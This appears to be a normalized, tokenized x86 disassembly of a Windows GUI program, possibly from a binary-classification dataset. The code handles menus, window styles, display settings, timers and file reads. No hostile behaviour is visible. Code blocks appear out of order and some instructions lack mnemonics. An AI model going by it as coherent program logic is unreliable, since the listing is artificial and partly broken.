push 0x208
lea ecx [ esp + 0x4c8 ]
push ecx
push esi
push edx
call ebp
test eax eax
je r-xdata
mov eax [ rw-data ]
and eax 0x7
cmp eax 0x2
je r-xdata
mov edx [ esp + 0x10950 ]
push edx
lea eax [ esp + 0x4c8 ]
push eax
call sub_4580e0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x78 ]
mov esi [ esp + 0x10 ]
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x4c ]
push ecx
call [ DeleteObject@IAT ]
mov edx [ esp + 0x10950 ]
push esi
push edx
call [ ReleaseDC@IAT ]
jmp r-xdata
mov ebx 0x56ce
mov [ esp + 0x48 ] 0x0
jmp r-xdata
push 0x0
lea edx [ esi + 0x56ce ]
push edx
push ebx
call ebp
inc esi
cmp esi edi
jl r-xdata
push 0x0
push 0x8
jmp r-xdata
push 0x83
push ebp
call esi
cmp [ rw-data ] 0x1
jne r-xdata
mov ebp 0x15f
mov ebx 0x7
mov ebx [ DeleteMenu@IAT ]
mov ebp 0xd
push edi
call [ GetMenuItemCount@IAT ]
cmp eax 0x11
jg r-xdata
push 0x0
push 0x8
jmp r-xdata
push 0xc8
push esi
call edi
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0x8
jmp r-xdata
push 0x0
push ebp
call esi
cmp [ rw-data ] 0x1
jne r-xdata
cmp bx 0x158
jb r-xdata
cmp bx 0x1a2
ja r-xdata
lea eax [ ebp - 0x15e ]
mov ebp [ rw-data ]
xor edx edx
cmp ebp eax
sete dl
dec edx
and edx eax
mov [ rw-data ] edx
call sub_46fdf0
jmp r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x17
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x18
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x19
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x1
push 0x1a
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
push eax
push 0x1
push 0x47
call sub_48a5f0
add esp 0xc
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x69
call sub_48a5f0
add esp 0xc
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
lea eax [ esi + eax + 0x4 ]
mov eax [ esi + eax + 0x4 ]
jmp r-xdata
mov al [ rw-data ]
test al al
mov edi [ ShowWindow@IAT ]
je r-xdata
push 0x0
push 0x0
call [ ChangeDisplaySettingsA@IAT ]
push r--data
xor bl bl
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x130 ]
push eax
push ecx
push 0x0
call [ EnumDisplaySettingsA@IAT ]
push 0x0
lea edx [ esp + 0x134 ]
push edx
mov [ esp + 0x15c ] 0x9c
mov [ esp + 0x160 ] 0x5c0000
call [ ChangeDisplaySettingsA@IAT ]
mov edi [ rw-data ]
test edi edi
push 0xfffffff0
setne dl
push esi
mov [ rw-data ] dl
call [ GetWindowLongA@IAT ]
mov [ rw-data ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi [ esp + 0x64 ]
sub edi eax
xor edi edi
jmp r-xdata
push ebx
lea eax [ esi + 0x1d ]
push eax
lea ecx [ esp + 0x64 ]
call sub_46b020
mov eax [ esp + 0x60 ]
cmp eax ebx
lea edi [ eax + esi ]
mov ecx 0x7
lea esi [ esp + 0x98 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0x105
push 0x111
push esi
call edi
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push eax
call ebx
cmp [ rw-data ] 0xc
jge r-xdata
cmp eax 0xc
jl r-xdata
call sub_45f9e0
mov eax [ rw-data ]
test eax eax
jle r-xdata
cmp [ esp + 0x94 ] edi
mov eax [ esp + 0x80 ]
jae r-xdata
mov edx [ rw-data ]
test edx edx
jne r-xdata
push 0x0
push edx
mov ecx rw-data
call sub_42c920
mov ecx esi
jmp r-xdata
mov ecx rw-data
call sub_42c3a0
mov ecx rw-data
mov esi eax
call sub_4010f0
push eax
mov ecx rw-data
call sub_42c9a0
mov ecx rw-data
call sub_42c3a0
cmp esi eax
jge r-xdata
push 0xffffffff
push edi
lea ecx [ esp + 0xa0 ]
push ecx
lea ecx [ esp + 0x11c ]
call sub_4018c0
lea ecx [ esp + 0x934 ]
call sub_434e80
cmp [ esp + 0x128 ] ebx
mov eax [ esp + 0x114 ]
mov [ esp + 0x10948 ] 0x7
jae r-xdata
push r--data
lea ecx [ esp + 0x114 ]
call sub_402010
mov edx [ ebx + 0x48 ]
push esi
lea ecx [ esp + 0x50 ]
push ecx
push edx
push ebp
push edi
call [ ReadFile@IAT ]
mov eax [ esp + 0x4c ]
push edi
mov [ eax + ebp ] 0x0
call [ CloseHandle@IAT ]
push esi
push esi
push 0x3
push esi
push 0x1
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
add ebx 0xc
mov ebx [ ebx + 0xc ]
jmp r-xdata
push 0xffffffff
lea eax [ esp + 0x4c8 ]
push eax
push 0x3
mov [ rw-data ] 0x1
call sub_423680
add esp 0xc
test eax eax
jne r-xdata
push 0x0
call sub_4290f0
mov edx [ rw-data ]
add esp 0x4
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x4d4 ]
push ecx
push eax
call sub_423c30
add esp 0x18
mov eax [ rw-data ]
mov ecx [ esp + 0x48 ]
add ecx eax
call sub_4010a0
push eax
lea ecx [ esp + 0x9c ]
call sub_4024d0
mov eax [ esp + 0xac ]
lea edx [ esp + 0x5c ]
push edx
push eax
lea ecx [ esp + 0xa0 ]
mov [ esp + 0x10950 ] 0xf
call sub_4010a0
mov ecx [ esp + 0x18 ]
push eax
push ecx
call [ GetTextExtentPoint32A@IAT ]
mov eax [ esp + 0x5c ]
xor esi esi
cmp eax 0x190
mov [ esp + 0x17 ] 0x0
jle r-xdata
push 0x0
push 0x8
jmp r-xdata
push 0xbb
push ebp
call esi
cmp [ rw-data ] 0x2
jne r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push ebp
lea eax [ esp + 0x2bc ]
push edi
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x11
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] eax
call [ GetMenuItemInfoA@IAT ]
mov ecx [ rw-data ]
xor eax eax
lea edx [ ebp - 0x15e ]
cmp edx ecx
setne al
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push ebp
push edi
mov [ esp + 0x30 ] esi
dec eax
and eax 0x8
mov [ esp + 0x34 ] eax
call [ SetMenuItemInfoA@IAT ]
inc ebp
dec ebx
jne r-xdata
jmp r-xdata
push 0x400
push 0x9
push edi
call ebx
dec ebp
jne r-xdata
xor ebp ebp
lea edx [ esp + 0x18 ]
push edx
push 0x400
push 0x9
push edi
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x10
mov [ esp + 0x30 ] 0x800
call [ InsertMenuItemA@IAT ]
mov ebp 0xa
mov ebx rw-data
mov [ esp + 0x10 ] 0xc
jmp r-xdata
push 0x1
push 0x0
jmp r-xdata
push 0xc9
push esi
call ebx
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
push 0x8
jmp r-xdata
push 0x12c
push ebp
call esi
cmp [ rw-data ] edi
jne r-xdata
cmp bx 0x1f4
jb r-xdata
cmp bx 0x15d
ja r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
lea esi [ ebp - 0x18f ]
je r-xdata
mov eax [ rw-data ]
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
jmp r-xdata
cmp bx 0x9c4a
mov [ rw-data ] esi
jne r-xdata
push esi
push 0xffffffff
push edi
push eax
call sub_486df0
add esp 0x10
mov ecx [ rw-data ]
push 0x0
push sub_488210
push ecx
push 0xa3
push 0xfffffffa
push edi
mov [ rw-data ] 0x0
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
cmp eax 0x1
jne r-xdata
fld [ esi * 4 + rw-data ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
fld [ rw-data ]
mov esi eax
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
cmp esi eax
je r-xdata
fld [ rw-data ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
fld [ esp + 0x7c ]
mov edi eax
fmul [ r--data ]
fstp [ esp ]
call sub_452500
add esp 0x4
cmp eax edi
je r-xdata
mov eax [ rw-data ]
cmp [ esi + eax + 0x18 ] 0x10
jb r-xdata
push 0x0
push eax
push 0x1
call sub_423680
add esp 0xc
cmp eax 0xffffff9d
jne r-xdata
push 0xcf0000
push 0xfffffff0
xor ebx ebx
push esi
mov [ rw-data ] ebx
call [ SetWindowLongA@IAT ]
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi [ GetSystemMetrics@IAT ]
xor ebx ebx
push ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call edi
push 0x1
mov [ rw-data ] eax
call edi
mov [ rw-data ] eax
jmp r-xdata
push r--data
push edi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x90 ]
mov eax [ esp + 0x60 ]
mov edx ecx
shr ecx 0x2
add edi eax
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea esi [ esp + 0x80 ]
mov ecx [ esp + 0x90 ]
add ecx edi
push ebx
push ecx
lea ecx [ esp + 0x64 ]
call sub_46b020
cmp [ esp + 0x94 ] ebp
mov esi [ esp + 0x80 ]
jae r-xdata
push 0x0
push 0x106
push 0x111
push esi
call edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push eax
call ebx
mov eax [ rw-data ]
dec eax
cmp ebx eax
mov [ rw-data ] ecx
jl r-xdata
mov [ rw-data ] ecx
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov eax [ rw-data ]
test eax eax
mov ecx [ ebx + 0x24 ]
mov esi [ rw-data ]
mov [ rw-data ] ecx
je r-xdata
xor ebp ebp
xor ebx ebx
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
lea eax [ esp + 0x80 ]
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx rw-data
xor esi esi
call sub_4010f0
test eax eax
jle r-xdata
lea esp [ esp ]
push eax
lea ecx [ esp + 0x938 ]
call sub_434ed0
test eax eax
je r-xdata
lea eax [ esp + 0x114 ]
push ebp
call j_sub_4b66ed
add esp 0x4
lea ecx [ esp + 0x5c ]
mov [ esp + 0x10948 ] 0xffffffff
call sub_403ab0
mov [ esp + 0xb0 ] 0xf
mov [ esp + 0xac ] esi
mov [ esp + 0x9c ] 0x0
lea ecx [ esp + 0x5c ]
mov [ esp + 0x10948 ] 0x1
call sub_4010c0
test eax eax
jle r-xdata
lea ecx [ esp + 0x5c ]
push ecx
push ebx
push ebp
call sub_454ba0
add esp 0xc
lea ecx [ esp + 0x5c ]
call sub_4010c0
test eax eax
jbe r-xdata
mov [ rw-data ] al
lea ecx [ esp + 0x98 ]
call sub_4010a0
push eax
lea eax [ ebx - 0x56cd ]
push eax
lea ecx [ esp + 0x828 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov ecx [ esp + 0x10968 ]
add esp 0x10
lea edx [ esp + 0x820 ]
push edx
push ebx
push 0x400
lea eax [ ebx - 0x56b9 ]
push eax
push ecx
call [ InsertMenuA@IAT ]
lea ecx [ esp + 0x98 ]
mov [ esp + 0x10948 ] 0xffffffff
call sub_4480e0
mov esi [ esp + 0x48 ]
add esi 0x1c
mov ecx rw-data
mov [ esp + 0x48 ] esi
inc ebx
call sub_4010c0
lea edx [ ebx - 0x56ce ]
cmp edx eax
jl r-xdata
lea ecx [ esp + 0x98 ]
call sub_4010a0
mov ebp eax
mov al [ esi + ebp ]
xor edi edi
test al al
je r-xdata
push 0x8
push 0x0
jmp r-xdata
push 0x100
push ebp
call esi
mov al [ rw-data ]
test al al
jne r-xdata
cmp ebp 0xa
jne r-xdata
fld [ rw-data ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
push eax
push r--data
jmp r-xdata
mov eax [ ebx ]
push eax
lea ecx [ ebp + 0x822b ]
push ecx
push 0x400
push ebp
push edi
call [ InsertMenuA@IAT ]
mov eax [ esp + 0x10 ]
add ebx 0x4
inc ebp
dec eax
mov [ esp + 0x10 ] eax
jne r-xdata
push r--data
lea edx [ esp + 0x134 ]
push edx
push r--data
lea ecx [ esp + 0x134 ]
push ecx
jmp r-xdata
push 0xe2
push esi
call edi
mov eax [ rw-data ]
test eax eax
mov ebp [ lstrcpyA@IAT ]
mov [ esp + 0x18 ] 0x30
je r-xdata
push 0x0
push 0x173
push ebp
call esi
jmp r-xdata
push 0x8
push 0x173
push ebp
call esi
jmp r-xdata
push 0xa4
push ebp
call esi
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp bx 0x209
jae r-xdata
mov eax [ rw-data ]
add ebp 0xfffffea8
test eax eax
mov [ rw-data ] ebp
je r-xdata
cmp [ rw-data ] 0x1d
mov [ rw-data ] esi
jne r-xdata
push esi
lea ecx [ eax + 0xe0 ]
call sub_421150
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
push edi
add ebp 0xffff63b8
push ebp
call sub_487240
add esp 0x8
jmp r-xdata
mov [ rw-data ] esi
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
jmp r-xdata
mov edx [ rw-data ]
push edx
push 0x0
push 0x1b
call sub_48a5f0
add esp 0xc
cmp [ rw-data ] esi
je r-xdata
lea esi [ esi + eax + 0x4 ]
mov esi [ esi + eax + 0x4 ]
jmp r-xdata
cmp [ rw-data ] ebx
mov [ rw-data ] ebx
je r-xdata
push eax
push esi
call [ SetMenu@IAT ]
push 0x5
push eax
call edi
cmp [ rw-data ] ebx
je r-xdata
push edi
call [ FreeLibrary@IAT ]
test bl bl
jne r-xdata
push esi
push sub_45d790
push 0x0
push 0x0
mov bl 0x1
call eax
push esi
call [ RevokeDragDrop@IAT ]
mov eax [ rw-data ]
cmp eax ebp
mov esi [ GlobalFree@IAT ]
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov ecx [ rw-data ]
push r--data
push ecx
call [ RemovePropA@IAT ]
mov ecx [ esp + 0x10950 ]
mov esi [ rw-data ]
push 0x1
push 0x0
push ebx
push ecx
mov [ rw-data ] 0x0
call sub_485220
mov [ rw-data ] esi
mov esi [ esp + 0x1096c ]
add esp 0x10
mov ebx eax
mov eax [ esi + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
mov ecx [ esi + 0xa4 ]
push ecx
call [ SetFocus@IAT ]
mov edx [ esi + 0xac ]
push 0x0
push edx
call [ ShowWindow@IAT ]
cmp [ rw-data ] 0x136
je r-xdata
cmp [ ebx + 0x51 ] 0x1
je r-xdata
cmp [ esp + 0x94 ] edi
mov eax [ esp + 0x80 ]
jae r-xdata
mov esi edi
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
push 0x5c
push 0x1
lea ecx [ esp + 0x84 ]
call sub_4017f0
mov [ edx + ecx * 4 ] 0x0
inc ecx
jmp r-xdata
cmp ecx eax
jge r-xdata
mov ecx rw-data
call sub_4010f0
cmp esi eax
jge r-xdata
xor ebx ebx
mov [ esp + 0x10 ] ebx
jmp r-xdata
mov edx [ rw-data ]
mov [ edx + esi * 4 ] 0x0
mov ecx rw-data
inc esi
call sub_42c3a0
cmp esi eax
jl r-xdata
lea ecx [ esp + 0x934 ]
mov [ esp + 0x10948 ] 0x6
call sub_434eb0
lea ecx [ esp + 0x98 ]
call sub_4480e0
lea ecx [ esp + 0x110 ]
mov [ esp + 0x10948 ] 0x4
call sub_4480e0
mov ecx rw-data
xor esi esi
call sub_4010f0
mov edx eax
nop
lea eax [ esp + 0x9c ]
xor edi edi
cmp [ esi + ebp ] 0x0
je r-xdata
lea ebx [ ebx ]
push 0x8
push 0x0
jmp r-xdata
push 0x77
push ebp
call esi
mov al [ rw-data ]
test al al
jne r-xdata
cmp ebp 0xb
jne r-xdata
fld [ rw-data ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
push eax
push r--data
jmp r-xdata
lea edx [ esp + 0x13c ]
push edx
call [ wsprintfA@IAT ]
lea ecx [ esp + 0x140 ]
add esp 0x10
lea eax [ esp + 0x130 ]
push ecx
mov [ esp + 0x40 ] eax
call [ lstrlenA@IAT ]
mov [ esp + 0x40 ] eax
push r--data
lea edx [ esp + 0x134 ]
push edx
push r--data
lea ecx [ esp + 0x134 ]
push ecx
jmp r-xdata
call ebp
mov edi [ rw-data ]
xor eax eax
test edi edi
setg al
lea edx [ esp + 0x130 ]
lea ecx [ esp + 0x130 ]
push edx
mov [ esp + 0x20 ] 0x11
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x40 ] ecx
dec eax
and eax 0x3
mov [ esp + 0x28 ] eax
call [ lstrlenA@IAT ]
mov edi [ SetMenuItemInfoA@IAT ]
mov [ esp + 0x40 ] eax
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0xe4
push esi
call edi
mov eax [ rw-data ]
test eax eax
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
call sub_42e150
jmp r-xdata
push esi
push rw-data
call sub_481f30
mov eax [ rw-data ]
add esp 0x8
cmp eax ebx
push 0x1
je r-xdata
push 0x1
push 0xffffffff
push edi
push 0x1d
mov [ rw-data ] esi
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call sub_486df0
add esp 0x10
jmp r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
mov ebp [ eax + 0x380 ]
and edx 0x7
cmp edx ebp
jne r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
push 0xffffffff
push edi
push esi
call sub_4863a0
add esp 0x2c
mov eax [ rw-data ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
push ebx
sub edx eax
push edx
mov edx [ rw-data ]
sub edx ecx
push edx
push eax
push ecx
push 0xfffffffe
push esi
mov [ rw-data ] 0x1
mov [ rw-data ] 0x2
call [ SetWindowPos@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
mov al [ rw-data ]
test al al
mov [ rw-data ] al
je r-xdata
mov edi [ LockWindowUpdate@IAT ]
push esi
call edi
cmp [ rw-data ] ebx
mov [ rw-data ] 0x1
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
xor ebx ebx
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push eax
call esi
mov edx [ rw-data ]
push sub_45ba40
push 0x7d0
push 0x3
push edx
mov [ rw-data ] 0x1
call [ SetTimer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp [ ebx + 0x6c ] edi
jb r-xdata
push 0x0
call sub_4231b0
mov eax [ esp + 0x98 ]
add esp 0x4
cmp eax edi
mov eax [ esp + 0x80 ]
jae r-xdata
mov dl [ ebx + 0x51 ]
test dl dl
sete dl
push 0x0
push 0x0
push edx
push 0x1
push eax
push 0x2
call sub_423c30
add esp 0x18
lea eax [ esp + 0x80 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x94 ]
add ecx ebx
cmp eax 0x10
mov eax [ esp + 0x80 ]
jae r-xdata
cmp ebp edx
jge r-xdata
mov edi [ LocalFree@IAT ]
xor esi esi
jmp r-xdata
mov ecx rw-data
lea edi [ esi + 0x1 ]
call sub_4010f0
mov ecx eax
xor edx edx
mov eax ebx
div ecx
mov ecx rw-data
push eax
call sub_4010f0
push eax
push edi
lea edx [ esp + 0x13c ]
push r--data
push edx
call ebp
mov ecx [ rw-data ]
add esp 0x14
lea eax [ esp + 0x130 ]
push eax
push ecx
call [ SetWindowTextA@IAT ]
push 0x1b
call [ GetAsyncKeyState@IAT ]
test ah ah
js r-xdata
mov eax 0x66666667
imul edx
sar edx 0x2
mov eax edx
shr eax 0x1f
add edx eax
inc esi
cmp edx edi
jne r-xdata
push esi
lea ecx [ esp + 0x274 ]
push r--data
push ecx
call ebp
push esi
lea edx [ esp + 0x28 ]
push r--data
push edx
call ebp
add esp 0x18
lea ecx [ esp + 0x4c ]
call sub_433b70
xor edi edi
mov ecx rw-data
mov [ esp + 0x10948 ] 0x8
mov [ esp + 0x10 ] edi
call sub_4010f0
test eax eax
jle r-xdata
mov edx [ esp + 0x60 ]
push 0xffffffff
push 0x0
add edx edi
push edx
lea ecx [ esp + 0xa4 ]
call sub_4018c0
push r--data
lea ecx [ esp + 0x9c ]
call sub_402010
lea ecx [ esp + 0x5c ]
inc esi
add edi 0x1c
call sub_4010c0
cmp esi eax
jl r-xdata
cmp [ esp + 0xb0 ] 0x10
mov eax [ esp + 0x9c ]
jae r-xdata
mov ecx [ esp + 0xac ]
lea eax [ esp + 0x5c ]
push eax
push ecx
lea ecx [ esp + 0xa0 ]
call sub_4010a0
mov edx [ esp + 0x18 ]
push eax
push edx
call [ GetTextExtentPoint32A@IAT ]
cmp [ esp + 0x5c ] 0x190
jg r-xdata
cmp al 0x5c
jne r-xdata
add esi 0x2
jmp r-xdata
push 0x0
push 0x8
jmp r-xdata
push 0xac
push ebp
call esi
cmp [ rw-data ] 0x1
jne r-xdata
lea edx [ esp + 0x18 ]
push edx
push 0x0
push ebx
push edi
call [ SetMenuItemInfoA@IAT ]
inc ebp
cmp ebp 0xc
jl r-xdata
fld [ rw-data ]
push ecx
fmul [ r--data ]
fstp [ esp ]
call sub_452500
push eax
push r--data
lea eax [ esp + 0x18 ]
push eax
push 0x0
lea ebx [ ebp + 0x8235 ]
push ebx
lea edx [ esp + 0x2bc ]
push edi
mov [ esp + 0x28 ] 0x30
mov [ esp + 0x2c ] 0x11
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x50 ] esi
mov [ esp + 0x4c ] edx
call [ GetMenuItemInfoA@IAT ]
mov edx [ rw-data ]
xor ecx ecx
cmp ebp edx
setne cl
mov [ esp + 0x20 ] esi
dec ecx
and ecx 0x8
cmp ebp 0x9
mov [ esp + 0x24 ] ecx
jne r-xdata
jmp r-xdata
call ebp
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0xe6
push esi
call edi
jmp r-xdata
mov eax [ rw-data ]
lea esi [ ebp - 0x1f4 ]
cmp esi eax
je r-xdata
push rw-data
push rw-data
call sub_419a80
add esp 0x8
cmp eax 0x1
jne r-xdata
mov ecx [ rw-data ]
push ebx
push ecx
push edi
call sub_485220
add esp 0x10
jmp r-xdata
push 0xffffffff
push edi
push eax
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call sub_486df0
add esp 0x10
jmp r-xdata
mov edx ebp
shl edx 0x7
mov edx [ edx + rw-data ]
mov [ esp + 0x20 ] edx
cmp [ eax + 0xf8 ] 0x10
jb r-xdata
push 0x5
push 0x3
jmp r-xdata
test [ rw-data ] 0x8
je r-xdata
push 0x1
call sub_451690
add esp 0x4
mov [ rw-data ] ebx
push esi
call [ GetMenu@IAT ]
push ebx
push esi
mov [ rw-data ] eax
call [ SetMenu@IAT ]
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
call sub_42c380
cmp [ rw-data ] ebp
je r-xdata
push eax
call esi
lea eax [ ebx + 0x58 ]
mov eax [ ebx + 0x58 ]
jmp r-xdata
mov edx [ rw-data ]
lea ecx [ esp + 0x4c ]
push ecx
mov cl [ ebx + 0x51 ]
test cl cl
sete cl
push edx
push ecx
push 0x1
push eax
push 0x0
call sub_423c30
add esp 0x18
lea eax [ esp + 0x80 ]
mov esi edi
sub esi ecx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov edx [ esp + 0x90 ]
push edx
push eax
mov eax [ ecx + 0x14 ]
push eax
push 0x0
call sub_401150
test eax eax
je r-xdata
lea eax [ esp + 0x80 ]
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ebx [ esp + 0x1095c ]
mov edx [ rw-data ]
mov eax [ edx + esi * 4 ]
test eax eax
lea ebp [ esi * 4 ]
jne r-xdata
mov ecx rw-data
call sub_4010f0
test eax eax
jle r-xdata
nop
push 0x1
push 0xffffffff
push eax
call sub_425d10
add esp 0xc
lea ecx [ esp + 0x98 ]
call sub_4480e0
lea ecx [ esp + 0x5c ]
call sub_403ab0
jmp r-xdata
inc esi
test edi edi
jne r-xdata
mov al [ esi + ebp ]
test al al
jne r-xdata
push 0x8
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x9c5f
push ebp
call esi
mov al [ rw-data ]
test al al
jne r-xdata
mov [ rw-data ] 0x0
call sub_40af10
test eax eax
je r-xdata
push esi
call sub_413350
add esp 0x4
mov [ rw-data ] 0x1
call sub_40af10
test eax eax
je r-xdata
mov [ rw-data ] al
add eax 0xe4
mov eax [ eax + 0xe4 ]
jmp r-xdata
push esi
call edi
movzx eax [ rw-data ]
push ebx
push ebx
shl eax 0x1
push ebx
mov [ rw-data ] eax
call [ InvalidateRect@IAT ]
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
mov edx [ rw-data ]
or edx 0x8
push 0x1
mov [ rw-data ] edx
call sub_451770
add esp 0x4
mov eax [ rw-data ]
test eax eax
mov bl [ rw-data ]
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
push ebx
push r--data
call [ FindWindowA@IAT ]
lea ecx [ esp + 0x5c ]
push ecx
push eax
call ebp
mov eax [ esp + 0x5c ]
cmp [ rw-data ] eax
jge r-xdata
push ebp
call [ PostQuitMessage@IAT ]
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ rw-data ] edx
mov [ rw-data ] eax
jmp r-xdata
push eax
call sub_4abd50
mov eax [ rw-data ]
add esp 0x4
test eax eax
jne r-xdata
test ecx ecx
jne r-xdata
cmp ebp 0x1
jl r-xdata
cmp ebp edx
je r-xdata
mov edi [ rw-data ]
mov ecx [ rw-data ]
inc ebp
add ebx 0x1c
jmp r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov edx [ esp + 0x10 ]
add edx 0x70
mov ecx rw-data
mov esi edi
add ebx 0x64
mov [ esp + 0x10 ] edx
call sub_4010f0
cmp esi eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x58 ]
add eax ecx
push edx
push eax
call sub_4053a0
add esp 0x14
test eax eax
jl r-xdata
lea ecx [ esp + 0x4c ]
mov [ esp + 0x10948 ] 0x7
call sub_475190
mov edi 0x1
mov ebx 0xf
jmp r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
jmp r-xdata
mov al [ esp + 0x17 ]
sub esi edi
test al al
lea ecx [ esp + 0x98 ]
je r-xdata
lea edi [ esi + 0x1 ]
push 0x8
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push 0x1
push 0x0
push edi
call sub_47e8e0
add esp 0xc
push 0x0
push 0x12c
push edi
call [ GetMenu@IAT ]
push eax
call [ CheckMenuItem@IAT ]
mov [ rw-data ] 0xffffffff
jmp r-xdata
push 0x0
push 0x3f5
push eax
call [ CheckDlgButton@IAT ]
push 0x1
push 0x0
push edi
call sub_47e8e0
add esp 0xc
push 0x8
push 0x12c
push edi
call [ GetMenu@IAT ]
push eax
call [ CheckMenuItem@IAT ]
mov [ rw-data ] esi
jmp r-xdata
push 0x1
push 0x3f5
push eax
call [ CheckDlgButton@IAT ]
lea edx [ esp + 0x18 ]
push edx
mov [ esp + 0x30 ] eax
mov eax [ rw-data ]
push eax
push 0x102e
push ecx
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push 0x1
call sub_451820
add esp 0x4
push 0x90080000
push 0xfffffff0
push esi
call [ SetWindowLongA@IAT ]
mov ebp [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
xor eax eax
push 0x60
test ebp ebp
mov ebp [ rw-data ]
setne al
sub edx ecx
push edx
mov edx [ rw-data ]
sub ebp edx
push ebp
push ecx
push edx
add eax 0xfffffffe
push eax
push esi
mov [ rw-data ] 0x2
call [ SetWindowPos@IAT ]
push 0x0
mov [ rw-data ] bl
call edi
mov al [ rw-data ]
test al al
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push ebx
mov [ rw-data ] ebx
call sub_451930
add esp 0x4
cmp eax ebx
jle r-xdata
mov [ rw-data ] eax
push ebp
push ebp
